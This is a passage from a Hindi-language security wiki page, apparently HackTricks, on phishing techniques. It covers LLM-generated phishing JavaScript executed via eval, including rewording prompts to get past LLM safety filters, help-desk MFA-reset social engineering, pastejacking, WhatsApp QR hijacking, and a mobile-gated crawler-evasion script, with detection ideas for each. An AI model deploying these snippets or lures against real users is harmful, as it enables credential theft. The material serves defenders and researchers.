Credential phishing के लिए agentic browsing abuse भी देखें:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Secrets inventory और detection के लिए local CLI tools और MCP के AI agent abuse को भी देखें:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers benign-looking HTML भेज सकते हैं और **trusted LLM API** से JavaScript मांगकर, फिर उसे in-browser execute करके **stealer को runtime पर generate** कर सकते हैं (जैसे `eval` या dynamic `<script>` के माध्यम से)।<sup>[[7]](#references)</sup>

1. **Prompt-as-obfuscation:** prompt में exfil URLs/Base64 strings encode करना; safety filters को bypass करने और hallucinations कम करने के लिए wording को iterate करना।
2. **Client-side API call:** load होने पर JS किसी public LLM (Gemini/DeepSeek/etc.) या CDN proxy को call करता है; static HTML में केवल prompt/API call मौजूद होता है।
3. **Assemble & exec:** response को concatenate करके execute करना (हर visit पर polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code lure को व्यक्तिगत बनाता है (e.g., LogoKit token parsing) और creds को prompt-hidden endpoint पर posts करता है।

**Evasion traits**
- Traffic well-known LLM domains या reputable CDN proxies तक पहुँचता है; कभी-कभी backend से WebSockets के माध्यम से।
- कोई static payload नहीं होता; malicious JS केवल render के बाद मौजूद होता है।
- Non-deterministic generations से हर session के लिए **unique** stealers बनते हैं।

**Detection ideas**
- JS enabled वाले sandboxes चलाएँ; **LLM responses से sourced runtime `eval`/dynamic script creation** को flag करें।
- LLM APIs पर होने वाले front-end POSTs के तुरंत बाद returned text पर `eval`/`Function` के उपयोग के लिए hunt करें।
- Client traffic में unsanctioned LLM domains और उसके बाद होने वाले credential POSTs पर alert करें।

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Classic push-bombing के अलावा, operators help-desk call के दौरान बस **नई MFA registration force** कर देते हैं, जिससे user का existing token निष्प्रभावी हो जाता है। इसके बाद आने वाला कोई भी login prompt victim को legitimate दिखाई देता है।
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta events को monitor करें, जहाँ **`deleteMFA` + `addMFA`** कुछ ही मिनटों के भीतर **एक ही IP** से occur हों।



## Clipboard Hijacking / Pastejacking

Attackers compromised या typosquatted web page से victim के clipboard में malicious commands को चुपचाप copy कर सकते हैं और फिर user को उन्हें **Win + R**, **Win + X** या terminal window में paste करने के लिए trick कर सकते हैं, जिससे बिना किसी download या attachment के arbitrary code execute हो जाता है।


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing और Malicious App Distribution (Android और iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* एक lure page (जैसे, fake ministry/CERT “channel”) WhatsApp Web/Desktop QR प्रदर्शित करता है और victim को उसे scan करने का निर्देश देता है, जिससे attacker चुपचाप **linked device** के रूप में add हो जाता है।<sup>[[10]](#references)</sup>
* Attacker को session remove किए जाने तक chat/contact visibility तुरंत मिल जाती है। Victims को बाद में “new device linked” notification दिखाई दे सकती है; defenders untrusted QR pages पर visits के तुरंत बाद होने वाले unexpected device-link events को hunt कर सकते हैं।

### Mobile‑gated phishing to evade crawlers/sandboxes
Operators अपने phishing flows को तेजी से एक simple device check के पीछे gate कर रहे हैं, ताकि desktop crawlers final pages तक न पहुँच सकें। एक common pattern में छोटा script touch-capable DOM के लिए test करता है और result को server endpoint पर post करता है; non‑mobile clients को HTTP 500 (या blank page) मिलता है, जबकि mobile users को पूरा flow serve किया जाता है।<sup>[[6]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` लॉजिक (सरलीकृत):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server behaviour अक्सर देखा जाता है:
- पहली load के दौरान session cookie सेट करता है।
- `POST /detect {"is_mobile":true|false}` स्वीकार करता है।
- बाद के GET requests के लिए `is_mobile=false` होने पर 500 (या placeholder) लौटाता है; केवल `true` होने पर phishing serve करता है।

Hunting और detection heuristics:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: non‑mobile के लिए `GET /static/detect_device.js` → `POST /detect` → HTTP 500 का क्रम; legitimate mobile victim paths 200 के साथ follow‑on HTML/JS लौटाते हैं।
- उन pages को block या scrutinize करें जो content को exclusively `ontouchstart` या इसी तरह के device checks पर निर्भर करते हैं।

Defence tips:
- gated content प्रकट करने के लिए crawlers को mobile‑like fingerprints और enabled JS के साथ चलाएँ।
- newly registered domains पर `POST /detect` के बाद आने वाले suspicious 500 responses पर alert करें।

## References

- [1] [Phishing में उपयोग किए जाने वाले Domain Variations बनाना (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing ढूँढना: Tools और Techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [EvilnoVNC से sessions चुराना और 2FA को bypass करना (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [4] [Debian Wheezy पर Postfix के साथ DKIM install और configure करने का तरीका (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [5] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [6] [Silent Smishing – mobile-gated phishing infra और heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [7] [Runtime Assembly Attacks की अगली सीमा: Real Time में Phishing JavaScript Generate करने के लिए LLMs का उपयोग](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [8] [Impersonation, Click Hijacking और TDS: Malware Distribution Ecosystem के अंदर](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [9] [Bitflipping से Microsoft's windows.com के traffic को Hijack करना (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [10] [Love? Actually: Pakistan में targeted spyware campaign में lure के रूप में उपयोग किया गया Fake dating app](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [11] [ESET GhostChat IoCs और samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
